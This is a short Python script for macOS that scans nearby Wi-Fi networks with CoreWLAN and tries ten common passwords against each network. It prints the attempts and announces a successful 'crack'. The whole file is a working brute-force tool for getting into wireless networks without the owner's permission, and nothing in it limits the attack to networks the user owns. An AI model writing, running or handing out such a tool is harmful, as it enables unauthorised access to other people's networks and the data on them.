import objc
from CoreWLAN import CWInterface, CWNetwork

TOP_PASSWORDS = [
    "12345678", "password", "123456789", "123456", "1234567890",
    "qwerty", "abc123", "11111111", "123123123", "password1"
]

def scan_wifi():
    iface = CWInterface.interface()
    networks = iface.scanForNetworksWithName_error_(None, None)[0]
    return networks

def try_connect(network, password):
    iface = CWInterface.interface()
    err = None
    success = iface.associateToNetwork_password_error_(network, password, objc.nil)
    return success

def main():
    print("🔍 Scanning nearby Wi-Fi networks...")
    networks = scan_wifi()

    for network in networks:
        ssid = network.ssid()
        print(f"\n📡 Trying SSID: {ssid}")
        for pwd in TOP_PASSWORDS:
            print(f"   🔑 Attempting password: {pwd}")
            if try_connect(network, pwd):
                print(f"✅ SUCCESS: Connected to '{ssid}' with password '{pwd}'")
                return
        print(f"❌ No luck cracking '{ssid}'")

if __name__ == "__main__":
    main()
